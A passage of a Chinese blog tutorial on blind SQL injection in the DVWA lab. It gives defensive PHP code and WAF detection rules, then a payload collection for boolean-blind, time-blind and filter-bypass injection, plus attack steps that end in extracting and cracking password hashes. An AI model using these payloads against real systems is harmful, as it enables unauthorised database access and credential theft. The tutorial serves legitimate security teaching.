class="number">5</span>：使用十六进制/<span class="variable">Unicode</span>绕过</span></span><br><span class="line"><span class="function"><span class="title">is_numeric</span>() → <span class="variable"><span class="literal">False</span></span> → 拒绝</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>关键防御点：</strong></p>
+<ol>
+<li><strong>白名单验证</strong> - 只接受数字</li>
+<li><strong>预编译语句</strong> - SQL结构固定</li>
+<li><strong>参数绑定</strong> - 类型强制转换</li>
+<li><strong>双重保护</strong> - 验证 + PDO</li>
+</ol>
+<hr>
+<h2 id="防御建议"><a href="#防御建议" class="headerlink" title="防御建议"></a>防御建议</h2><h3 id="代码层面"><a href="#代码层面" class="headerlink" title="代码层面"></a>代码层面</h3><h4 id="1-使用PDO预编译（最佳方案）"><a href="#1-使用PDO预编译（最佳方案）" class="headerlink" title="1. 使用PDO预编译（最佳方案）"></a>1. 使用PDO预编译（最佳方案）</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ✅ 正确：PDO预编译</span></span><br><span class="line"><span class="variable">$stmt</span> = <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&#x27;SELECT * FROM users WHERE id = :id&#x27;</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bindParam</span>(<span class="string">&#x27;:id&#x27;</span>, <span class="variable">$id</span>, PDO::<span class="variable constant_">PARAM_INT</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 或使用execute()直接传递参数</span></span><br><span class="line"><span class="variable">$stmt</span> = <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&#x27;SELECT * FROM users WHERE id = ?&#x27;</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>([<span class="variable">$id</span>]);</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-输入验证和白名单"><a href="#2-输入验证和白名单" class="headerlink" title="2. 输入验证和白名单"></a>2. 输入验证和白名单</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 验证数字</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$id</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Invalid input&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 验证字符串（白名单）</span></span><br><span class="line"><span class="variable">$allowed</span> = [<span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;user&#x27;</span>, <span class="string">&#x27;guest&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$input</span>, <span class="variable">$allowed</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Invalid input&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 正则验证</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-zA-Z0-9_]+$/&#x27;</span>, <span class="variable">$input</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Invalid characters&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="3-最小权限原则"><a href="#3-最小权限原则" class="headerlink" title="3. 最小权限原则"></a>3. 最小权限原则</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 数据库用户只有SELECT权限</span></span><br><span class="line"><span class="comment">// 即使被注入，也无法DELETE/UPDATE/DROP</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// config.php</span></span><br><span class="line"><span class="variable">$db_user</span> = <span class="string">&#x27;read_only_user&#x27;</span>; <span class="comment">// 只读用户</span></span><br><span class="line"><span class="variable">$db_pass</span> = <span class="string">&#x27;secure_password&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 授权（在MySQL中）</span></span><br><span class="line">GRANT SELECT ON database.* TO <span class="string">&#x27;read_only_user&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<h4 id="4-错误处理"><a href="#4-错误处理" class="headerlink" title="4. 错误处理"></a>4. 错误处理</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ❌ 不要显示数据库错误</span></span><br><span class="line"><span class="comment">// die(mysql_error());</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ✅ 记录错误到日志</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">&#125; <span class="keyword">catch</span> (PDOException <span class="variable">$e</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">error_log</span>(<span class="string">&#x27;Database error: &#x27;</span> . <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>());</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;An error occurred&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="检测层面"><a href="#检测层面" class="headerlink" title="检测层面"></a>检测层面</h3><h4 id="1-WAF规则"><a href="#1-WAF规则" class="headerlink" title="1. WAF规则"></a>1. WAF规则</h4><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ModSecurity规则示例</span></span><br><span class="line"><span class="attribute">SecRule</span> ARGS <span class="string">&quot;<span class="variable">@detectSQLi</span>&quot;</span> \</span><br><span class="line">    <span class="string">&quot;id:1000,phase:2,block,msg:&#x27;SQL Injection Detected&#x27;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 检测常见SQL注入模式</span></span><br><span class="line">SecRule ARGS <span class="string">&quot;<span class="variable">@rx</span> (union|select|insert|update|delete|drop|exec|script)&quot;</span> \</span><br><span class="line">    <span class="string">&quot;id:1001,phase:2,block,msg:&#x27;SQL Keyword Detected&#x27;&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="2-监控异常查询"><a href="#2-监控异常查询" class="headerlink" title="2. 监控异常查询"></a>2. 监控异常查询</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 记录慢查询</span></span><br><span class="line"><span class="variable">$start</span> = <span class="title function_ invoke__">microtime</span>(<span class="literal">true</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line"><span class="variable">$duration</span> = <span class="title function_ invoke__">microtime</span>(<span class="literal">true</span>) - <span class="variable">$start</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$duration</span> &gt; <span class="number">1.0</span>) &#123;</span><br><span class="line">    <span class="comment">// 查询超过1秒，可能是时间盲注</span></span><br><span class="line">    <span class="title function_ invoke__">logSecurityEvent</span>(<span class="string">&#x27;Slow query detected&#x27;</span>, [</span><br><span class="line">        <span class="string">&#x27;duration&#x27;</span> =&gt; <span class="variable">$duration</span>,</span><br><span class="line">        <span class="string">&#x27;ip&#x27;</span> =&gt; <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>],</span><br><span class="line">        <span class="string">&#x27;query&#x27;</span> =&gt; <span class="variable">$query</span></span><br><span class="line">    ]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="3-限流和账户锁定"><a href="#3-限流和账户锁定" class="headerlink" title="3. 限流和账户锁定"></a>3. 限流和账户锁定</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 检测暴力破解</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkAttempts</span>(<span class="params"><span class="variable">$ip</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$attempts</span> = <span class="title function_ invoke__">getAttempts</span>(<span class="variable">$ip</span>, <span class="number">60</span>); <span class="comment">// 过去60秒</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$attempts</span> &gt; <span class="number">10</span>) &#123;</span><br><span class="line">        <span class="comment">// 锁定IP 5分钟</span></span><br><span class="line">        <span class="title function_ invoke__">lockIP</span>(<span class="variable">$ip</span>, <span class="number">300</span>);</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Too many attempts&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">recordAttempt</span>(<span class="variable">$ip</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h3><h4 id="SQLMap防御测试"><a href="#SQLMap防御测试" class="headerlink" title="SQLMap防御测试"></a>SQLMap防御测试</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 测试自己的应用</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://your-site.com/page?id=1&quot;</span> \</span><br><span class="line">       --batch \</span><br><span class="line">       --level=5 \</span><br><span class="line">       --risk=3</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果SQLMap无法注入，说明防护有效</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="代码审计工具"><a href="#代码审计工具" class="headerlink" title="代码审计工具"></a>代码审计工具</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用PHPStan检查SQL注入</span></span><br><span class="line">phpstan analyze src/ --level=8</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用SonarQube</span></span><br><span class="line">sonar-scanner \</span><br><span class="line">    -Dsonar.projectKey=myproject \</span><br><span class="line">    -Dsonar.sources=src</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="总结对比"><a href="#总结对比" class="headerlink" title="总结对比"></a>总结对比</h2><table>
+<thead>
+<tr>
+<th>特性</th>
+<th>Low</th>
+<th>Medium</th>
+<th>High</th>
+<th>Impossible</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>查询方式</td>
+<td>字符串拼接</td>
+<td>mysqli_escape</td>
+<td>mysqli_escape</td>
+<td>PDO预编译</td>
+</tr>
+<tr>
+<td>参数传递</td>
+<td>GET</td>
+<td>POST</td>
+<td>Cookie</td>
+<td>GET</td>
+</tr>
+<tr>
+<td>输入验证</td>
+<td>❌</td>
+<td>❌</td>
+<td>❌</td>
+<td>✅ is_numeric</td>
+</tr>
+<tr>
+<td>错误信息</td>
+<td>✅ 显示</td>
+<td>❌ 隐藏</td>
+<td>❌ 隐藏</td>
+<td>❌ 隐藏</td>
+</tr>
+<tr>
+<td>限流</td>
+<td>❌</td>
+<td>❌</td>
+<td>✅ 弱限流</td>
+<td>✅ CSRF</td>
+</tr>
+<tr>
+<td>LIMIT</td>
+<td>❌</td>
+<td>❌</td>
+<td>✅ LIMIT 1</td>
+<td>✅ LIMIT 1</td>
+</tr>
+<tr>
+<td>攻击难度</td>
+<td>极易</td>
+<td>简单</td>
+<td>中等</td>
+<td>极难</td>
+</tr>
+<tr>
+<td>布尔盲注</td>
+<td>✅ 可行</td>
+<td>✅ 可行</td>
+<td>✅ 可行</td>
+<td>❌ 不可行</td>
+</tr>
+<tr>
+<td>时间盲注</td>
+<td>✅ 可行</td>
+<td>✅ 可行</td>
+<td>✅ 可行</td>
+<td>❌ 不可行</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="常用Payload集合"><a href="#常用Payload集合" class="headerlink" title="常用Payload集合"></a>常用Payload集合</h2><h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 基础测试</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; AND 1=1 --        → True</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">AND</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="comment">--        → False</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 数据库信息</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; AND LENGTH(database())&gt;5 --</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">AND</span> <span class="built_in">SUBSTRING</span>(database(),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;d&#x27;</span> <span class="comment">--</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; AND ASCII(SUBSTRING(database(),1,1))&gt;100 --</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- 表名枚举</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">AND</span> (<span class="keyword">SELECT</span> <span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="keyword">FROM</span> information_schema.tables <span class="keyword">WHERE</span> table_schema<span class="operator">=</span>database())<span class="operator">&gt;</span><span class="number">5</span> <span class="comment">--</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),1,1)=&#x27;</span>u<span class="string">&#x27; --</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- 数据提取</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">AND</span> <span class="built_in">SUBSTRING</span>((<span class="keyword">SELECT</span> password <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> <span class="keyword">user</span><span class="operator">=</span><span class="string">&#x27;admin&#x27;</span>),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;5&#x27;</span> <span class="comment">--</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- MySQL</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; AND SLEEP(5) --</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">AND</span> IF(<span class="number">1</span><span class="operator">=</span><span class="number">1</span>, SLEEP(<span class="number">5</span>), <span class="number">0</span>) <span class="comment">--</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; AND IF((SELECT SUBSTRING(database(),1,1))=&#x27;</span>d<span class="string">&#x27;, SLEEP(5), 0) --</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- 基于BENCHMARK</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">AND</span> BENCHMARK(<span class="number">5000000</span>, MD5(<span class="string">&#x27;test&#x27;</span>)) <span class="comment">--</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- PostgreSQL</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; AND pg_sleep(5) --</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- SQL Server</span></span><br><span class="line"><span class="string">1&#x27;</span>; WAITFOR DELAY <span class="string">&#x27;00:00:05&#x27;</span> <span class="comment">--</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="绕过技巧"><a href="#绕过技巧" class="headerlink" title="绕过技巧"></a>绕过技巧</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 大小写混淆</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; AnD 1=1 --</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">aNd</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> <span class="comment">--</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 内联注释</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; AND/**/1=1 --</span></span><br><span class="line"><span class="string">1&#x27;</span><span class="comment">/*comment*/</span><span class="keyword">AND</span><span class="comment">/*comment*/</span><span class="number">1</span><span class="operator">=</span><span class="number">1</span><span class="comment">--</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 编码绕过</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; AND 0x31=0x31 --</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">AND</span> <span class="type">CHAR</span>(<span class="number">49</span>)<span class="operator">=</span><span class="type">CHAR</span>(<span class="number">49</span>) <span class="comment">--</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="实战建议"><a href="#实战建议" class="headerlink" title="实战建议"></a>实战建议</h2><p><strong>盲注攻击步骤：</strong></p>
+<ol>
+<li>确认注入点（测试True&#x2F;False）</li>
+<li>确定数据库类型和版本</li>
+<li>枚举数据库名和表名</li>
+<li>枚举列名</li>
+<li>逐字符提取数据</li>
+<li>破解密码哈希</li>
+</ol>
+<p><strong>自动化工具：</strong></p>
+<ul>
+<li><strong>SQLMap</strong> - 全自动SQL注入工具</li>
+<li><strong>NoSQLMap</strong> - NoSQL盲注工具</li>
+<li><strong>Burp Suite</strong> - 手动测试和自动化</li>
+</ul>
+<p><strong>防御检查：</strong></p>
+<ul>
+<li>✅ 所有查询使用预编译</li>
+<li>✅ 输入验证（白名单）</li>
+<li>✅ 最小权限</li>
+<li>✅ 限流机制</li>
+<li>✅ 错误不泄露信息</li>
+<li>✅ 定期安全审计</li>
+</ul>
+<p><strong>道德准则：</strong></p>
+<ul>
+<li>只在授权环境测试</li>
+<li>不窃取真实数据</li>
+<li>学习是为了构建安全系统</li>
+</ul>
+
+    </div>
+
+    
+    
+    
+        <div class="reward-container">
+  <div>点这里请我吃个小蛋糕吧～～</div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    Donate
+  </button>
+  <div id="qr" style="display: none;">
+      
+      <div style="display: inline-block;">
+        <img src="/images/wechat.jpg" alt="caixuya WeChat Pay">
+        <p>WeChat Pay</p>
+      </div>
+      
+      <div style="display: inline-block;">
+        <img src="/images/alipay.jpg" alt="caixuya Alipay">
+        <p>Alipay</p>
+      </div>
+
+  </div>
+</div>
+
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:  </strong>caixuya
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link: </strong>
+    <a href="http://caixuya.github.io/2025/11/20/SQL_Injection_Blind_%E6%94%BB%E9%98%B2%E7%BB%83%E4%B9%A0/" title="DVWA - SQL Injection (Blind) 攻防练习详解">http://caixuya.github.io/2025/11/20/SQL_Injection_Blind_攻防练习/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+        
+
+  <div class="followme">
+    <p>Welcome to my other publishing channels</p>
+
+    <div class="social-list">
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="/images/wechat_channel.jpg">
+            <span class="icon">
+              <i class="fab fa-weixin"></i>
+            </span>
+
+            <span class="label">WeChat</span>
+          </a>
+        </div>
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="/atom.xml">
+            <span class="icon">
+              <i class="fa fa-rss"></i>
+            </span>
+
+            <span class="label">RSS</span>
+          </a>
+        </div>
+    </div>
+  </div>
+
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2025/11/20/XSS_DOM_%E6%94%BB%E9%98%B2%E7%BB%83%E4%B9%A0/" rel="prev" title="DVWA - XSS (DOM) 攻防练习详解">
+      <i class="fa fa-chevron-left"></i> DVWA - XSS (DOM) 攻防练习详解
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2025/11/20/SQL_Injection_%E6%94%BB%E9%98%B2%E7%BB%83%E4%B9%A0/" rel="next" title="DVWA - SQL Injection (SQL注入) 攻防练习详解">
+      DVWA - SQL Injection (SQL注入) 攻防练习详解 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9B%AE%E5%BD%95"><span class="nav-number">1.</span> <span class="nav-text">目录</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B"><span class="nav-number">2.</span> <span class="nav-text">漏洞简介</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E7%9B%B2%E6%B3%A8%EF%BC%88Blind-SQL-Injection%EF%BC%89%EF%BC%9F"><span class="nav-number">2.1.</span> <span class="nav-text">什么是盲注（Blind SQL Injection）？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%EF%BC%88Boolean-based-Blind-SQL-Injection%EF%BC%89"><span class="nav-number">2.2.</span> <span class="nav-text">1. 布尔盲注（Boolean-based Blind SQL Injection）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8%EF%BC%88Time-based-Blind-SQL-Injection%EF%BC%89"><span class="nav-number">2.3.</span> <span class="nav-text">2. 时间盲注（Time-based Blind SQL Injection）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Low-%E9%9A%BE%E5%BA%A6"><span class="nav-number">3.</span> <span class="nav-text">Low 难度</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E7%9B%AE%E6%A0%87"><span class="nav-number">3.1.</span> <span class="nav-text">攻击目标</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%90%8E%E7%AB%AF%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="nav-number">3.2.</span> <span class="nav-text">后端代码分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-number">3.3.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E6%AD%A5%E9%AA%A4"><span class="nav-number">3.4.</span> <span class="nav-text">攻击步骤</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%AD%A5%E9%AA%A41%EF%BC%9A%E6%B5%8B%E8%AF%95SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="nav-number">3.4.1.</span> <span class="nav-text">步骤1：测试SQL注入漏洞</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%AD%A5%E9%AA%A42%EF%BC%9A%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8-%E7%A1%AE%E5%AE%9A%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BF%A1%E6%81%AF"><span class="nav-number">3.4.2.</span> <span class="nav-text">步骤2：布尔盲注 - 确定数据库信息</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%AD%A5%E9%AA%A43%EF%BC%9A%E6%9E%9A%E4%B8%BE%E6%95%B0%E6%8D%AE%E5%BA%93%E8%A1%A8"><span class="nav-number">3.4.3.</span> <span class="nav-text">步骤3：枚举数据库表</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%AD%A5%E9%AA%A44%EF%BC%9A%E6%9E%9A%E4%B8%BE%E8%A1%A8%E7%9A%84%E5%88%97%E5%90%8D"><span class="nav-number">3.4.4.</span> <span class="nav-text">步骤4：枚举表的列名</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%AD%A5%E9%AA%A45%EF%BC%9A%E6%8F%90%E5%8F%96%E6%95%B0%E6%8D%AE"><span class="nav-number">3.4.5.</span> <span class="nav-text">步骤5：提取数据</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%AD%A5%E9%AA%A46%EF%BC%9A%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8%EF%BC%88%E5%BD%93%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E4%B8%8D%E5%8F%AF%E7%94%A8%E6%97%B6%EF%BC%89"><span class="nav-number">3.4.6.</span> <span class="nav-text">步骤6：时间盲注（当布尔盲注不可用时）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%AD%A5%E9%AA%A47%EF%BC%9A%E4%BD%BF%E7%94%A8SQLMap%E8%87%AA%E5%8A%A8%E5%8C%96"><span class="nav-number">3.4.7.</span> <span class="nav-text">步骤7：使用SQLMap自动化</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Medium-%E9%9A%BE%E5%BA%A6"><span class="nav-number">4.</span> <span class="nav-text">Medium 难度</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E7%9B%AE%E6%A0%87-1"><span class="nav-number">4.1.</span> <span class="nav-text">攻击目标</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%90%8E%E7%AB%AF%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-1"><span 